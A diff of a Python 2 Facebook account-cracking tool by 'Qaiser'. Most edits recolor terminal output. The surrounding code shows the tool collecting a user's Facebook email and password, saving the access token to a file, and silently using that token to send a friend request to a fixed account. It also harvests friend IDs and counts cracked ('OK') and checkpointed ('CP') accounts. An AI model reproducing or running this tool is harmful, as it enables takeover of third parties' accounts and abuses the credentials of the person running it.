@@ -173,9 +173,9 @@ CorrectPassword = "M500"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[96;49;4m🔐 Tool Username : \x1b[0:31m")
+    username = raw_input("\033[96;49;4m🔐 Tool Username : ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[96;49;4m🔐Tool Password : \x1b[0;31m")
+    	password = raw_input("\033[96;49;4m🔐Tool Password : ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username #Dev:qaiser
 	    time.sleep(2)
@@ -196,13 +196,13 @@ def lisensi():
 def login():
 	os.system('clear')
 	print logo
-	print "\033[1;97m[1]\033[1;47m\033[1;31mLogin With Facebook "
+	print "\033[1;97m[1]\033[1;36mLogin With Facebook "
         time.sleep(0.05)
-        print "\033[1;97m[2]\033[1;47m\033[1;31mLogin With Token             "
+        print "\033[1;97m[2]\033[1;36mLogin With Token             "
         time.sleep(0.05)
-        print "\033[1;97m[3]\033[1;47m\033[1;31mSubscribe YouTube Channel    "
+        print "\033[1;97m[3]\033[1;36mSubscribe YouTube Channel    "
         time.sleep(0.05)
-        print "\033[1;97m[0]\033[1;47m\033[1;31mExit                  "
+        print "\033[1;97m[0]\033[1;47m\033[1;36mExit                  "
 	time.sleep(0.05)
 	pilih_login()
 
@@ -233,11 +233,11 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo                
-		print "\033[92;49;41m----------------- = Commands By Qaiser = -----------------"
-		print('\033[92;49;41mLogin New Fresh Fb Account\x1b[1;97m' )
+		print "\033[1;93m----------------- = Commands By Qaiser = -----------------"
+		print('\033[1;93mLogin New Fresh Fb Account\x1b[1;97m' )
 		print('	' )
-		id = raw_input('\033[96;4;45mNumber/Email\x1b[1;97m: \x1b[1;97m')
-		pwd = raw_input('\033[96;4;45mPassword\x1b[1;97m    : \x1b[1;97m')
+		id = raw_input('\033[1;93mNumber/Email\x1b[1;97m: \x1b[1;97m')
+		pwd = raw_input('\033[1;93mPassword\x1b[1;97m    : \x1b[1;97m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -264,7 +264,7 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\033[1;47m\033[1;95mLogin Successful\033[1;0m'
+				print '\033[1;95mLogin Successful\033[1;0m'
 				os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -382,7 +382,7 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[96;4;45m----------------- = Tool By Qaiser = -----------------"
+		print "\033[1;93m---------------- = Tool By Qaiser = -----------------"
 		print logo
 		jalan('\033[1;93mGetting Accounts\033[1;97m')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
@@ -391,7 +391,7 @@ def pilih_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[96;4;45m----------------- = Tool By Qaiser = -----------------"
+		print " \033[1;93m----------------- = Tool By Qaiser = -----------------"
 		print logo
 		idt = raw_input("\033[1;95mEnter ID\033[1;92m: \033[1;97m")
 		try:
@@ -641,15 +641,15 @@ def pilih_super():
 	print"\033[1;96mTotal \033[1;95mOK/\x1b[1;91mCP \033[1;91m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
 	print "\033[1;93m----------------= Toll By Qaiser = -----------------"
 	print """
-\033[96;4;45m▒▒▒▒▒▒▒▒▒▒▒▒▒▒Thanks
-\033[96;4;45m▒▒▒▒▒▒▒▒▒▒▒▒▒For
-\033[96;4;45m▒▒▒▒▒▒▒▒▒▒▒Using
-\033[96;4;45m▒▒▒▒▒▒▒▒▒▒My 
-\033[96;4;45m▒▒▒▒▒▒▒▒Commands
-\033[96;4;45m▒▒▒▒▒▒Also
-\033[96;4;45m▒▒▒▒Subscribe
-\033[96;4;45m▒▒My
-\033[96;4;45m▒Channel ( TechQaiser )
+\033[1;93m▒▒▒▒▒▒▒▒▒▒▒▒▒▒Thanks
+\033[1;93m▒▒▒▒▒▒▒▒▒▒▒▒▒For
+\033[1;93m▒▒▒▒▒▒▒▒▒▒▒Using
+\033[1;93m▒▒▒▒▒▒▒▒▒▒My 
+\033[1;93m▒▒▒▒▒▒▒▒Commands
+\033[1;93m▒▒▒▒▒▒Also
+\033[1;93m▒▒▒▒Subscribe
+\033[1;93m▒▒My
+\033[1;93m▒Channel ( TechQaiser )
 
 """
 	print "\033[1;97m----------------- = Tool By Qaiser = ----------------"
